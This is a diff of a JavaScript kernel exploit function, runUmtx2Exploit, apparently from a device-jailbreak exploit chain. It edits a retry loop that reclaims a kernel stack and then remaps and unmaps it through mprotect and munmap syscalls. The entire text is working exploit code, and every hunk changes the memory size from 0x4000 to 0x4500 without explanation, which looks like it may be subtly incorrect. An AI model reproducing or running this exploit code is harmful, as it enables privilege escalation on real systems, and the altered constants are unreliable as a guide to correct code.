@@ -964,7 +964,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         if (closeRes != 0 || (kstack.low << 0) == -1) {
             await log("Failed to reclaim kstack. Retrying...", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4500);
             }
             kstack = null;
             continue;
@@ -977,11 +977,11 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         // change memory protections to r/w
         const PROT_READ = 0x1;
         const PROT_WRITE = 0x2;
-        const mprotectRes = await chain.syscall_int32(SYS_MPROTECT, kstack, 0x4000, PROT_READ | PROT_WRITE);
+        const mprotectRes = await chain.syscall_int32(SYS_MPROTECT, kstack, 0x4500, PROT_READ | PROT_WRITE);
         if (mprotectRes != 0) {
             await log("mprotect failed. Retrying...", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4500);
             }
             kstack = null;
             continue;
@@ -995,7 +995,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
             checkMemoryAccessFailCount++;
             await log("Failed to access kstack memory. Retrying...", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4500);
             }
             kstack = null;
             await new Promise((resolve) => setTimeout(resolve, 1000));
@@ -1008,7 +1008,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         if (kprimId == null) {
             await log("Failed to get kprim id from kstack. Retrying..", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4500);
             }
             kstack = null;
             continue;
